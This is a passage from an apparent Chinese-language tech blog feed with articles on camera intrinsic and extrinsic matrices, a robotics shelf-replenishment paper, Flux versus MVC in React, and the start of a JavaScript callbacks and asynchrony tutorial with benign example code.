剛剛我們提到，目前所使用的單位還是真實世界中的單位（例如公分）。但是，在影像中的座標都是用像素的位置來呈現，所以我們希望可以將單位轉換成 pixel 數。那要怎麼換呢？其實很簡單，我們只要將所有以 cm 為單位的值，都乘上 pixel&#x2F;cm（每公分有多少個 pixel），自然就可以換成 pixel 數啦。
在一般情況下，u 方向跟 v 方向的單位像素個數不會相同，所以我們就分別用 $m_u$、$m_v$ 來表示 u 方向跟 v 方向每公分有幾個像素。這樣的話，矩陣就會變成下面的形式，u、v 的單位就變成 pixel 了：
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} m_uf &amp; 0 &amp; m_ut_u \ 0 &amp; m_vf &amp; m_vt_v \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
到這邊為止，就是大家常看到的內部參數矩陣的長相。但是，如果要寫成最完整的的形式，還需要考慮 u 軸跟 v 軸不垂直的狀況，這會使得每一個像素變成一個平行四邊形，如下圖所示：

從圖中可以看到，在這個像素裡面，u 的值會隨著 v 的增加而增加，所以 u 應該要額外加上 $tan(\alpha)v$，也就會可以讓我們將矩陣寫成下面的形式：（其中 $ s &#x3D; \alpha_ytan(\alpha)$）
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} m_uf &amp; s &amp; m_ut_u \ 0 &amp; m_vf &amp; m_vt_v \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
外部參數矩陣經過上面的介紹，我們已經了解，內部參數矩陣可以幫助我們將相機座標系的某一個三維點座標投影到影像平面上的二維像素座標，但是，如果只用相機座標的話，在應用上常常會遇到一些麻煩的地方。舉例來說，如果我們現在是要用一個 camera 做 3D SLAM，在過程中，我們的相機會一直移動，這會造成我們之前已經有的某些點座標，也必須隨著相機的移動，而不斷更新。這時候，如果可以有一個世界座標系一直維持不動，就可以有一個錨定的座標系，而物體的座標點就由是藉座標系定義。
下面這張圖很清楚地可以看出外部參數矩陣的功能：

總結用一張圖來總結，可以再將整個定位複習一次。

內部參數矩陣：處理相機座標系到影像座標系的投影
外部參數矩陣：處理世界座標系到相機座標系的座標轉換


延伸閱讀
Pinhole Camera: 針孔相機座標成像原理
計算機視覺-相機內參數和外參數
What Is Camera Calibration?

關於作者：

@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
@sherrychuang

]]></content>
      <tags>
        <tag>Pinhole camera model</tag>
        <tag>Intrinsic matrix</tag>
      </tags>
  </entry>
  <entry>
    <title>一起讀 Knowledge-Enabled Robotic Agents for Shelf Replenishment in Cluttered Retail Environments</title>
    <url>/2018/05/19/intro-to-robot-shelf-replenishment/</url>
    <content><![CDATA[前言今天來跟大家一起看一篇論文，可以讓機器人將貨架整理成指定的樣子，算是比較進階的機器人應用。大家可以先看個影片，對整個應用會比較有概念。

系統 overview有 overview，就比較能夠繼續往下看。所以首先讓我們來看看整個系統架構：

整個系統的運作流程如下：

CRAM 先產生最初的任務 - 重新整理貨架，整理成跟 KNOWROB 中儲存的樣貌一樣
CRAM 向 ROBOSHERLOCK 提出 query ，以偵測有哪些物品
ROBOSHERLOCK 調出儲存在 KNOWROB 裡的 semantic map，了解只需要偵測貨架上的物品即可
偵測出有哪些物品後，回傳給 CRAM
CRAM 規劃出一個可以把貨架整理好的 plan
執行剛剛規劃好的 plan（若中途失敗，就重新規劃）

這一系列的步驟中，有三個極為重要的黑盒子 - CRAM、KNOWROB 跟 ROBOSHERLOCK。接下來我們會分別簡介。
PerceptionPerception 這個功能主要是交給 ROBOSHERLOCK 這個黑盒子，他比較特別的地方在於，他是把 perception 這個任務用 query-answer 的角度來切入。
什麼意思呢？
舉例來說，我們可以送給 ROBOSHERLOCK 下面這種 query：
(detect (an object            (category container)            (capacity (≥ 1 liter))))

ROBOSHERLOCK 就會想辦法回傳給你大於 1 公升的容器。看到這邊是不是覺得很酷呢？因為這種 perception 的機制有點像是人類要完成一件事情時，心中會有的想法。例如我們如果要念書，我們就會想「我的課本在哪裡呢？」，然後就會有相對應的知識讓我們可以正確地知道課本在哪裡。
而之所以能夠回答這種問題，在於 ROBOSHERLOCK 在設計之初就將 knowledge 跟物體綁在一起，可以看看下面這張圖，裡面的每個物體都有一些相對應的 knowledge - color, shape, text, size 等等，這些 knowledge 是利用 KNOWROB 這個 knowledge base 來儲存，看完下一個部分就會知道怎麼儲存。

KnowledgeKnowledge 相關的東西，都是儲存在 KNOWROB 裡面。一言以蔽之，KNOWROB 就只是一個 knowledge base，只是這個 knowledge base 裡面的知識，都是用 Web Ontology Language (OWL) 來儲存。
用 OWL 儲存的好處是，所有的知識都可以用 description logic 來表示，比如說

換句話說，我們可以用嚴謹的邏輯來儲存類別的知識（男人、人），可以儲存個體的知識（張三）。這種知識表達的方法不僅僅是儲存了機器人所需要用到的知識，也讓機器人易於使用。舉個例子：

瓶子是容器
桌上的瓶子.size: medium

假設 medium 大於 1 公升，那當 ROBOSHERLOCK 被 query 要找大於 1 公升的容器時，就可以利用 KNOWROB 的知識，很容易推論出目前辨識出的 medium size bottle 符合需求。
而實際上，機器人要做的整個任務都是可以用知識來表示的，看看這張圖就很清楚了：

Plan and Execution有了 perception 的能力，也有相關的 knowledge 可以使用，接下來要進場的就是實際規劃可以把貨架收拾好的計畫，還有執行。這個就交給 CRAM 來處理。
CRAM 的核心精神是為了讓機器人可以更有彈性地完成任務，如果想看稍微詳細一點的介紹，可以參考這篇 CRAM 簡介。
因為 CRAM 的設計有跟 manipulation 等 module 相接，所以可以用來執行任務，可以參考這個架構圖：

總結今天跟大家一起簡單地看過了這篇很 high level 的論文，因為裡面用到的三大黑盒子都太高級了，其實只看這篇論文沒有辦法對整個系統有透徹的了解。不過，機器人這麼複雜的系統，有一篇較大的 paper，這篇 paper 再包含一些厲害的 paper 也不為過吧。
延伸閱讀
CRAM Tutorials
KnowRob 2.0 — A 2nd Generation Knowledge Processing Framework for Cognition-enabled Robotic Agents
ROBOSHERLOCK: Unstructured Information Processing for Robot Perception

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>CRAM</tag>
        <tag>KnowRob</tag>
        <tag>RoboSherlock</tag>
        <tag>Cognitive Robot</tag>
      </tags>
  </entry>
  <entry>
    <title>從 Flux 與 MVC 的差異來簡介 Flux</title>
    <url>/2016/04/29/introduce-flux-from-flux-and-mvc/</url>
    <content><![CDATA[今天這篇主要是想藉由Flux的介紹，進而探討Flux與MVC的差異，到底Flux做對了什麼，而MVC又犯了什麼錯呢？
首先我們回顧一下2014 F8大會 - Hacker Way的影片其中 Jing Chen 用了兩張圖來做對比，說明MVC的觀念在複雜的Application下難以維護。

經驗豐富一點的Developer看到這張圖的第一個念頭應該會是：”What the fxxx… 誰家的MVC長這樣啊？” 沒錯！Jing Chen 事後在Reddit上也有回覆，主要是想利用這張圖把MVC在大型架構下，資料 與 視圖 之間的 bi-directional data flow，容易造成cascading effects的問題凸顯出來。
為了解決她說的這個問題，Facebook 提出了Flux
FluxFlux是一種讓你很容易做到 one-way data flow 的概念，讓你View中的每個component的state都能夠predictable。

Views Dispatch ActionsDispatcher是一個重要的event system，用來broadcast events以及registers callbacks，一般來說Dispatcher是唯一且global的，可以參考Facebook的Dispatcher Library（題外話，有許多一些Flux的framework並非這樣使用）
簡單來看個Dispatcher的例子：
// 假設你initiate一個dispatchervar AppDispatcher = new Dispatcher();//.//..//...//在你的 component.jsx 中，可能會有這樣的程式createNewItem: function( evt ) &#123;  AppDispatcher.dispatch(&#123;    actionName: &#x27;newPhoto&#x27;,    newItem: &#123; name: &#x27;Happy Holiday&#x27; &#125; // example data  &#125;);&#125;render: function() &#123;  return (&lt;button onClick=&#123; this.createNewItem &#125;&gt;New Photo&lt;/button&gt;);&#125;

當每次的onClick發生後，View就會透過Dispatcherdispatch出一個Action，該Action可以包含一個payload，說明你想做什麼事情以及你需要操作什麼資料。
Store Responds to Dispatched ActionsStore在Flux的架構內，通常是Singleton(一樣，有些framework並非這樣做，尤其是想達成isomorphic時，可以參考Yahoo Fluxible)
在Flux的概念中，Store基本上是你唯一可以操作資料與儲存資料的地方。去除操作資料的部分，聽起來有點像MVC中的Model? 更明確一點來說，Store contains Models
舉例來說，當你需要存放一些照片以及其Meta data時，你會Create一個PhotoStore來存放Photo model與Meta model。你會依照資料的Domain來切割你的Store。
var PhotoStore = &#123;  // collection of model data  photos: []&#125;AppDispatcher.register(function(payload) &#123;  switch( payload.actionName ) &#123;    case &#x27;newPhoto&#x27;:      PhotoStore.photos.push(payload.newPhoto);      break;  &#125;&#125;)

Store會向Dispatcher註冊Callback，依照各種action的類別執行相對應的資料操作。
Store Emits “Change” Event to View當你的Store資料做完更新後，要告訴前端頁面去刷新視圖，通常可以在Store註冊的Callback中執行以下動作：
AppDispatcher.register(function(payload) &#123;  switch( payload.actionName ) &#123;    case &#x27;newPhoto&#x27;:      PhotoStore.photos.push(payload.newPhoto);      // trigger &quot;Change&quot; event 通知View去做更新      PhotoStore.trigger(&#x27;change&#x27;);      break;  &#125;&#125;)

接著，如果你是搭配React當作你的View的話，可能會在componentDidMount時，binding一個Store listener
componentDidMount: function() &#123;      PhotoStore.bind( &#x27;change&#x27;, this.photoChange );&#125;,

在listener中重新fetch store資料，並且setState來re-render Component
photoChange: function() &#123;      var newPhotoData = PhotoStore.getPhoto();    this.setState(&#123;      photos: newPhotoData    &#125;);&#125;

你的Component的render function大概會像這樣：
render: function() &#123;  var photosComponet = this.state.photos.map(function(photo, i)&#123;    return (      &lt;li key=&#123;&#x27;photo&#x27;+i&#125;&gt;        &#123;photo&#125;      &lt;/li&gt;    );            &#125;);  return (    &lt;div&gt;      &lt;ul&gt;        &#123;photosComponet&#125;      &lt;/ul&gt;    &lt;/div&gt;  );&#125;

看完簡單的Flux介紹後，讓我們再複習一次Flux的流程圖

相信在業界打滾多年的Developer們應該早有疑惑了，Flux的那張圖，跟最原始的MVC圖不是很像嗎？！

User操作View所產生的任何event，都會經由Controller來修改與更動相關的Model，而Model再告知View是否需要做更動，聽起來也是蠻one-way direction的呀。
事實上，MVC 跟 Flux 都只是一個概念，因此有各種不同的實作，加上MVC在資料流的處理上，並不像Flux一般有較為明確的定義，多數時候Model的更動與View的刷新可能會透過Controller來管理，讓Model單純存放data。
如此一來，假若今天View的操作更動了Model，而Model的變化又刷新了View，在系統龐大的時候，一來一往，就會讓你的資料與頁面狀態變得非常複雜，要追蹤某個頁面的變動到底是誰觸發的，或是哪個資料改變了，你必須從Controller去慢慢trace。而若是遵照Flux的流程，任何View的update都只要去追蹤其State的來源Store即可，有一個明確的flow可以遵循，並且每個View所需要監聽的資料來源，可以依照Store來區分，這之間的資料流不會互相干擾。另外一個Flux的好處是，能夠更輕鬆的做出更Unit的Unit test。這是你在複雜的Controller中難以達成的。
當然，你可能會想：“這是你MVC用得不好“。 
我覺得這樣講也沒什麼不對，如果你MVC用得很熟很順手，的確單單是Flux這個東西對你的誘因可能不高，但當一間明星公司大力Promote，對於基本概念的定義又夠清楚單純時，還是值得你試試。更別說Flux搭配上React的宣告式寫法，用起來更是如魚得水。
結論Flux做的是：

改善資料狀態與視圖狀態的 Data Flow
讓頁面的狀態Predictable
資料流不會互相污染
讓你的測試更加容易

而MVC在關注點分離上的貢獻不可小覷，重視在將資料(Model)、視圖(View)、邏輯(Controller)拆開，各自負責各自的工作。
因此並非是MVC不好、不對，所以我們應該採用Flux；Flux是在MVC建立的基礎下，定義出一個清楚的one-way direction資料流，並且透過Action、Dispatcher與Store來幫助整個概念的實現。
One more thing如同前面所提，Flux的實作有很多種，這邊介紹的只是最基本的流程，很多Framework在設計自己的Dispatcher, Action 與 Store時，會有不同的方式，或許可以從這邊的比較下去看看

Flux Comparison
Awesome React

參考資料

Flux for stupid people
Facebook: MVC Does Not Scale, Use Flux Instead

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>MVC</tag>
        <tag>Flux</tag>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 中的同步與非同步（上）：先成為 callback 大師吧！</title>
    <url>/2019/10/05/javascript-async-sync-and-callback/</url>
    <content><![CDATA[前言如果要舉出一個在 JavaScript 裡面很重要也很常用，但新手常常搞混的概念，那「非同步（Asynchronous）」當仁不讓，絕對是第一名。跟其他那些 this、closure、prototype 或是 hoisting 比起來，非同步在實際開發的時候用到的頻率高太多了，而且是初學者常常會踩坑的地方。
非同步真的那麼難嗎？
我相信不是的。只要循著一個正確的脈絡前進，就可以循序漸進理解為什麼需要非同步，也能知道在 JavaScript 裡面是怎麼處理這種操作的。
類似的主題我其實在四年前就寫過，但現在回頭看實在是寫得滿差的，所以四年後重新挑戰這個主題，希望能寫出一篇品質不錯的文章，把非同步這件事情講清楚。
在寫這篇文章之前，參考了 Node.js 的官方文件，發現在非同步的講解上其實做得不錯，因此本文會以類似的切入點開始談這個問題。如果不會 Node.js 也沒關係，我底下會稍微做點介紹。
建議閱讀本文以前需要具備 JavaScript 基礎，知道如何使用 JavaScript 操作 DOM，也知道什麼是 ajax。
接著就讓我們開始吧！


Node.js 基本介紹JavaScript 是一個程式語言，會有程式語言本身所規範可以用的東西，例如說用var宣告變數，用if else進行判斷，或者是使用function宣告函式，這些東西都是 JavaScript 這個程式語言本身就有的部分。
既然我上面說了「程式語言本身就有的部分」，就代表也有一些東西其實是「不屬於 JavaScript 這個程式語言的」。
例如說document.querySelector(&#39;body&#39;)，可以讓你拿到 body 的 DOM 物件並且對它做操作，而操作之後會即時反應在瀏覽器的畫面上。
這個 document 是哪來的？其實是瀏覽器給 JavaScript 的，這樣才能讓 JavaScript 透過 document 這個物件與瀏覽器進行溝通，來操控 DOM。
如果你去翻 ECMAScript 的文件，你會發現裡面完全沒有出現document這個東西，因為它不是這個程式語言本身的一部份，而是瀏覽器提供的。
如果在瀏覽器上面跑 JavaScript，我們可以把瀏覽器稱作是 JavaScript 的「執行環境（runtime）」，因為 JavaScript 就跑在上面嘛，十分合理。
除了 document 以外，像是拿來計時的 setTimeout 與 setInterval，拿來做 ajax 的 XMLHttpRequest 與 fetch，這些都是瀏覽器這個執行環境所提供的東西。
那如果換了一個執行環境，是不是就有不同的東西可以用？除了瀏覽器以外，還有別的 JavaScript 的執行環境嗎？
真巧，還真的剛好有，而且剛好你也聽過，就叫做 Node.js。
有很多人都以為它是一個 JavaScript 的 library，但其實不然，不過也不能怪大家，因為最後的.js兩個字很容易讓人誤解。如果你覺得那兩個字一直誤導你的話，可以暫且把它叫做 Node 就好。
Node.js 其實是 JavaScript 的一個執行環境，就如同它自己在官網上所說的：

Node.js® is a JavaScript runtime built on Chrome’s V8 JavaScript engine.

所以 JavaScript 程式碼可以選擇跑在瀏覽器上，就可以透過瀏覽器這個執行環境提供的東西操控畫面，或者是發 Request 出去；也可以選擇跑在 Node.js 這個執行環境上面，就可以利用 Node.js 提供的東西。
那 Node.js 提供了什麼呢？例如說fs，全稱為 file system，是控制檔案的介面，所以可以用 JavaScript 來讀寫電腦裡的檔案！還提供了http這個模組，可以用 JavaScript 來寫 server！
詳情請參考底下的示意圖：

可以很清楚地看到當 JavaScript 在不同環境底下執行時，可以用的東西也不一樣，端看執行環境提供了什麼。眼尖的人可能會發現上圖中 setTimeout 在兩個環境都有出現，這是為什麼呢？
因為這兩個環境都覺得計時器這功能很重要，所以都提供了 setTimeout 這個函式給開發者使用。在兩個環境上的功能雖然是一模一樣的，但要注意的是因為執行環境不同，所以背後的實作方式以及原理也不同。
另外，執行環境不同，執行方式也會不同。以瀏覽器來說，就是用&lt;script src=&quot;index.js&quot;&gt;去引入一個 JavaScript 檔案，就可以在瀏覽器上執行；以 Node.js 來說，必須先在電腦上安裝 Node.js 這個執行環境，然後以 CLI 的方式用node index.js這個指令來執行。
幫大家整理一下目前的重點：

JavaScript 只是程式語言，需要搭配執行環境提供的東西，例如說 setTiemout、document 等等
最常見的 JavaScript 執行環境有兩個，一個是瀏覽器，一個是 Node.js
不同的執行環境會提供不同的東西，例如說 Node.js 提供了 http 這個模組讓 JavaScript 可以寫一個伺服器，但瀏覽器就沒有提供這種東西

再來，我們會以 Node.js 的角度來開始介紹同步與非同步。
阻塞與非阻塞前面有提過 Node.js 有提供控制檔案的介面，讓我們可以寫一段 JavaScript 來讀取與寫入檔案，讓我們來看一段實際的程式碼：
const fs = require(&#x27;fs&#x27;) // 引入內建 file system 模組const file = fs.readFileSync(&#x27;./README.md&#x27;) // 讀取檔案console.log(file) // 印出內容

上面這段程式碼先引入Node.js 提供的內建模組fs，再來使用fs.readFileSync來讀取檔案，最後把檔案的內容用console.log給印出來。
（附註：其實上面印出來的東西會是一個Buffer，完整程式碼應該為file.toString(&#39;utf8&#39;)才會印出檔案內容。但因為這個小細節不妨礙理解，所以在範例程式碼中刻意忽略）
看起來好像沒什麼問題…嗎？
如果檔案小的話的確是沒什麼問題，但如果檔案很大呢？例如說檔案有 777 MB 好了，要把這麼大的檔案讀進記憶體，可能要花個幾秒鐘甚至更久。
在讀取檔案的時候，程式就會停在第二行，要等讀取檔案完畢以後，才會把檔案內容放到 file 這個變數裡，並且執行第三行console.log(file)。
換句話說，fs.readFileSync這個 method「阻擋」了後續指令的執行，這時候我們就說這個 method 是阻塞（blocking）的，因為程式的執行會一直 block 在這裡，直到執行完畢並且拿到回傳值為止。
如果後續的指令本來就都要等到檔案讀取完畢才能執行，例如說在檔案裡面尋找某個字串等等，這樣的方式其實沒什麼問題。但如果後續有些指令跟讀取檔案完全不相干，這不就虧大了嗎？
舉例來說，如果我們想要讀取檔案，並且找出 1 到 99999999 之間的偶數：
const fs = require(&#x27;fs&#x27;)const file = fs.readFileSync(&#x27;./README.md&#x27;) // 在這邊等好幾秒才往下執行console.log(file)  const arr = []for (let i = 2; i &lt;= 99999999; i+=2) &#123;  arr.push(i)&#125;  console.log(arr)

上面的程式碼會先在讀取檔案那一行卡個幾秒，接著才執行下面的那一個部分，算出 1 到 99999999 之間的偶數並且印出來。
這兩件事情明明一點關聯都沒有，憑什麼印出偶數這件事情要等讀取檔案讀完才能做？難道兩件事情不能同時做嗎？這樣豈不是更有效率？
還真的有這種東西，有另外一種方法可以讓這兩件事情同時進行。
原本readFileSync的問題在於它會阻塞後續程式碼的執行，就好像我去家裡附近的滷味攤買滷味，點好了交給老闆之後就要站在旁邊等，哪裡也不能去，因為我想吃到熱騰騰的滷味。如果我回家了然後每隔十分鐘再過來，可能滷味已經冷掉了，我不想這樣，我買的又不是冰滷味。
所以我只能站在旁邊癡癡等，癡癡冷，才能在第一時間就拿到剛起鍋的滷味。
阻塞（blocking）的對照就叫做非阻塞（non-blocking），意思就是不會阻擋後續程式碼的執行，就好像我去百貨公司美食街點餐一樣，點完以後店家會給我一個呼叫器（本體是紅茶的那間速食店也有），我拿到呼叫器以後就可以回位子上等，或我想先去逛個街也可以。等到餐點準備好的時候，呼叫器就會響，我就可以去店家領取餐點，不用在原地傻傻地等。
以讀取檔案來說，如果是非阻塞的話，是怎麼做到的呢？如果不會阻擋後續程式碼執行，那我該怎麼拿到檔案的內容？
就跟美食街需要透過呼叫器來通知餐點完成一樣，在 JavaScript 想要做到非阻塞，你必須提供一個呼叫器給這個讀取檔案的 method，這樣它才能在檔案讀取完畢時來通知你。在 JavaScript 裡面，function 就很適合當作呼叫器！
意思就是「當檔案讀取完畢時，請來執行這個 function，並且把結果傳進來」，而這個 function 又被稱作 callback function（回呼函式），有沒有突然覺得這名字取得真好？
Node.js 裡的 fs 模組除了readFileSync這一個 blocking 的 method 以外，還提供了另一個叫做readFile的 method，就是我們前面提到的非阻塞版本的讀取檔案，我們來看看程式碼長什麼樣子：
// 讀取內建 fs 模組const fs = require(&#x27;fs&#x27;)  // 定義讀取檔案完成以後，要執行的 functionfunction readFileFinished(err, data) &#123;  if (err) &#123;    console.log(err)  &#125; else &#123;    console.log(data)  &#125;&#125;  // 讀取檔案，第二個參數是 callback functionfs.readFile(&#x27;./README.md&#x27;, readFileFinished);

可以看得出來readFile的用法跟readFileSync差不多，但差別在於：

readFile多了一個參數，而且要傳進參數的是一個 function
readFileSync有回傳值，回傳值就是檔案內容，readFile看起來沒有

這就呼應到我上面所說的，blocking 與 non-blocking 的差別就在於 blocking 的 method 會直接回傳結果（也是因為這樣所以才會阻塞），但 non-blocking 的 method 執行完 function 以後就可以直接跳下一行了，檔案讀取完畢以後會把結果傳進 callback function。
在上面的程式碼中，readFileFinished 就是 callback function，就是美食街的呼叫器。「等餐點好了，讓呼叫器響」就跟「等檔案讀取完畢，讓 callback 被呼叫」是一樣的事情。
所以這一行：fs.readFile(&#39;./README.md&#39;, readFileFinished)的白話文解釋很簡單，就是：「請去讀取./README.md這個檔案，並且在讀取完畢以後呼叫readFileFinished，把結果傳進去」。
那我怎麼知道結果會怎麼傳進來？這就要看 API 文件了，每個 method 傳進來的參數都不一樣，以readFile來說，官方文件是這樣寫的：

裡面清楚寫到 callback 的第一個參數是 err，第二個參數是 data，也就是檔案內容。
所以fs.readFile做的事情很簡單，就是以某種不會阻塞的方式去讀取檔案，並且在讀取完成之後呼叫 callback function 並且把結果傳進去。
通常 callback function 都會使用匿名函式（Anonymous function）的寫法讓它變得更簡單，所以比較常見的形式其實是這樣：
// 讀取內建 fs 模組const fs = require(&#x27;fs&#x27;)  // 讀取檔案fs.readFile(&#x27;./README.md&#x27;, function(err, data) &#123;  if (err) &#123;    console.log(err)  &#125; else &#123;    console.log(data)  &#125;&#125;);

可以想成就是直接在第二個參數的地方宣告一個 function 啦，因為沒有名稱也不用給名稱，所以就叫做匿名函式。
而readFile既然不會阻塞，就代表後面的程式碼會立刻執行，因此我們來把前面找偶數的版本改寫成非阻塞看看：
const fs = require(&#x27;fs&#x27;)  /*  原來的阻塞版本：    const file = fs.readFileSync(&#x27;./README.md&#x27;) // 在這邊等好幾秒才往下執行*/  fs.readFile(&#x27;./README.md&#x27;, function(err, data) &#123;  if (err) &#123;    console.log(err)  &#125; else &#123;    console.log(data)  &#125;&#125;);  const arr = []for (let i = 2; i &lt;= 99999999; i+=2) &#123;  arr.push(i)&#125;  console.log(arr)

這樣子在等待讀檔的那幾秒鐘，系統就可以先往下執行做其他事情，不需要卡在那邊。
幫大家重點回顧一下：

阻塞（blocking）代表執行時程式會卡在那一行，直到有結果為止，例如說readFileSync，要等檔案讀取完畢才能執行下一行
非阻塞（non-blocking）代表執行時不會卡住，但執行結果不會放在回傳值，而是需要透過回呼函式（callback function）來接收結果

同步與非同步讀到這邊，你可能會疑惑說：「不是說要講同步（synchronous）與非同步（asynchronous）嗎？怎麼還沒出現？」
其實已經講完了。
Node.js 的官方文件是這麼說的：

Blocking methods execute synchronously and non-blocking methods execute asynchronously.


阻塞的方法會同步地（synchronously）執行，而非阻塞的方法會非同步地（asynchronously）執行

readFileSync最後面的 Sync 就是代表synchronous的意思，說明這個方法是同步的。而readFile則是非同步的。
如果硬要用中文字面上的意思去解釋，會非常的痛苦，會想說：「同步不是同時進行嗎？感覺比較像是非阻塞阿，但怎麼卻反過來了？」
我從程式設計該同步還是非同步？得到了一個啟發，那就是只要換個方式解釋「同步」在電腦的領域中代表的意思就行了。
現在請想像有一群人腳綁在一起，在玩兩人三腳。這時候我們若是想讓他們「統一步伐」，也就是大家的腳步一致（同步），該怎麼做呢？當然是大家互相協調互相等待啊，腳速比較快的要放慢，比較慢的要變快。如果你已經踏了第一步，要等還沒踏出第一步的，等到大家都踏出第一步之後，才能開始踏出第二步。
所以不同的人在協調彼此的步伐，試著讓大家的腳步一致，就必須互相等待，這個就是同步。
非同步就很簡單了，就是意思反過來。雖然在玩兩人三腳，但沒有想要等彼此的意思，大家都各踏各的，所以有可能排頭已經到終點了，排尾還在中間的地方，因為大家腳步不一致，不同步。
程式也是一樣的，前面提過的又要讀檔又要印出偶數的範例中，同步指的就是彼此互相協調互相等待，所以讀檔還沒完成的時候，是不能印偶數的，印出偶數一定要等到讀取檔案結束之後才能進行。
非同步就是說各做各的，你讀檔就讀你的，我繼續印我的偶數，大家腳步不一致沒關係，因為我們本來就不同步。
總之呢，在討論到 JavaScript 的同步與非同步問題時，基本上你可以把非同步跟非阻塞劃上等號，同步與阻塞劃上等號。如果你今天執行一個同步的方法（例如說readFileSync），就一定會阻塞；如果執行一個非同步的方法（readFile），就一定不會阻塞。
不過要幫大家稍微補充一下，如果你不是在 JavaScript 而是在其他的層次討論這個問題時，答案就不一樣了。舉例來說，當你在查阻塞非阻塞以及同步非同步的時候，一定會查到一些跟系統 I&#x2F;O 有關的資料，我覺得那是不同層次的討論。
當你是在討論系統或是網路 I&#x2F;O 的時候，非同步跟非阻塞講的就是兩件事情，同步跟阻塞也是兩件事，是有不同含義的。
但如果我們的 context 侷限在討論 JavaScript 的同步與非同步問題，基本上 blocking 就是 synchronous，non-blocking 就是 asynchronous。前面提到的 Node.js 的官方文件也是把這兩個概念給混用。
一旦我們把這兩個東西劃上等號，就很好理解什麼是同步，什麼是非同步了，我直接把上一個段落的重點回顧改一下就行了：

同步（synchronous）代表執行時程式會卡在那一行，直到有結果為止，例如說readFileSync，要等檔案讀取完畢才能執行下一行
非同步（asynchronous）代表執行時不會卡住，但執行結果不會放在回傳值，而是需要透過回呼函式（callback function）來接收結果

瀏覽器上的同步與非同步前面都是以 Node.js 當做例子，現在終於要回歸到我們比較熟悉的前端瀏覽器了。
在前端寫 JavaScript 的時候有一個很常見的需求，那就是跟後端 API 串接拿取資料。假設我們有一個函式叫做getAPIResponse好了，可以 call API 拿資料回來。
同步的版本會長得像這樣：
const response = getAPIResponse()console.log(response)

同步會發生什麼事？就會阻塞後面的執行，所以假設 API Server 主機規格很爛跑很慢需要等 10 秒，整個 JavaScript 引擎都必須等 10 秒，才能執行下一個指令。在我們用 Node.js 當範例的時候，有時候等 10 秒是可以接受的，因為只有執行這個程式的人需要等 10 秒而已，我可以去滑個 Instagram 再回來就好。
可是瀏覽器可以接受等 10 秒嗎？
你想想看喔，如果把 JavaScript 的執行凍結在那邊 10 秒，就等於說讓執行 JavaScript 的執行緒（thread）凍結 10 秒。在瀏覽器裡面，負責執行 JavaScript 的叫做 main thread，負責處理跟畫面渲染相關的也是 main thread。換句話說，如果這個 thread 凍結 10 秒，就代表你怎麼點擊畫面都不會有反應，因為瀏覽器沒有資源去處理這些其他的事情。
也就是說，你的畫面看起來就像當掉了一樣。
（如果不知道什麼是 thread，請參考：Inside look at modern web browser，建議從 part1 開始讀，main thread 在 part3 的地方）
舉一個生活中的例子來比喻，如果你去你家巷口的店面點一塊雞排，點完之後一定要在現場等，這時候如果你朋友來找你玩，按你家門鈴，你就沒辦法回應，因為你不在家。所以你朋友只好乾等在那邊，等你買完雞排才能幫他們開門。
但如果店家導入了線上排隊系統，點完雞排之後可以透過 App 查看雞排製作狀況，那你就可以回家邊看電視邊等雞排，這時候如果朋友來按門鈴，你就可以直接幫他們開門，你朋友不用乾等。
「等雞排」指的就是「等待 Response」，「幫你朋友開門」指的就是「針對畫面的反應」，而「你」就是「main thread」。在你忙著等雞排的時候，是沒辦法幫朋友開門的。
畫面凍結的部分可以自己做一個很簡單的 demo 來驗證，只要建立一個這樣的 html 檔案就好了：
&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div&gt;凍結那時間，凍結初遇那一天&lt;/div&gt;  &lt;/body&gt;  &lt;script&gt;    var delay = 3000 // 凍結 3 秒    var end = +new Date() + delay    console.log(&#x27;delay start&#x27;)    while(new Date() &lt; end) &#123;    &#125;    console.log(&#x27;delay end&#x27;)  &lt;/script&gt;&lt;/html&gt;

原理就是裡面的 while 會不斷去檢查時間到了沒，沒到的話就繼續等，所以會阻塞整個 main thread。也可以參考底下的 gif，在 delay end 出現之前，怎麼反白文字都沒有用，直到 delay end 出現以後才正常：

你可以接受畫面凍結嗎？不行嘛，就算你可以接受，你老闆、你客戶也不可能接受，所以像是網路這麼耗時的操作，是不可能讓它同步執行的。既然要改成非同步，那依據之前學過的，就要改成用 callback function 來接收結果：
// 底下會有三個範例，都在做一模一樣的事情// 主要是想讓初學者知道底下三個是一樣的，只是寫法不同  // 範例一// 最初學者友善的版本，額外宣告函式function handleResponst() &#123;  console.log(response)&#125;getAPIResponse(handleResponst)  // 範例二// 比較常看到的匿名函式版本，功能跟上面完全一樣getAPIResponse(function(err, response) &#123;  console.log(response)&#125;)  // 範例三// 利用 ES6 箭頭函式簡化過後的版本getAPIResponse((err, response) =&gt; &#123;  console.log(response)&#125;)

AJAX 的全名是：Asynchronous JavaScript and XML，有沒有看到開頭那個 A 的全名是：Asynchronous，就代表是非同步送出 Request 的意思。
上面我們用了一個假想中的函式 getAPIResponse 來做示範，主要是想說明「網路操作在前端不可能用同步的方式」，接著可以來看一下實際在前端呼叫後端 API 的程式碼會長什麼樣子：
var request = new XMLHttpRequest();request.open(&#x27;GET&#x27;, &#x27;https://jsonplaceholder.typicode.com/users/1&#x27;, true);  request.onload = function() &#123;  if (this.status &gt;= 200 &amp;&amp; this.status &lt; 400) &#123;    console.log(this.response)  &#125;&#125;;  request.send();

你可能會想說：咦，怎麼看起來不太一樣？callback function 在哪裡？
這邊的 callback function 就是 request.onload =  後面的那個函式，這一行的意思就是說：「當 response 回來時，請執行這個函式」。
此時，眼尖的人可能會發現：「咦？怎麼request.onload這個形式有點眼熟？」
